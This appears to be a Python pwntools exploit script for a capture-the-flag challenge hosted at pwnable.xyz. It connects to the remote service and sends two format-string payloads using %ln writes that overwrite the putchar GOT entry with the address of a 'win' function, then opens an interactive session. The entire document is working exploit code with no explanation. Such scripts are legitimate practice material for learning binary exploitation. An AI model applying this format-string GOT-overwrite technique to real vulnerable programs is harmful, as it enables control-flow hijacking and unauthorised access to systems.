from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30013)
putchar_got_addr = 0x602020
win_addr = 0x40094c

# gdb.attach(p, """
# b *main+337
# b *main+356
# """)

payload = b'%' + str(putchar_got_addr).encode() + b'x%11$ln' + b'a'*40
p.sendlineafter('Name: ', payload)
# 
payload = b'%' + str(win_addr).encode() + b'x%37$ln '
# payload = '%34$p %35$p %36$p %37$p'
p.sendlineafter('Desc: ', payload)

p.sendafter('> ', '3')
# print(p.recvline()[20:-1])
p.interactive()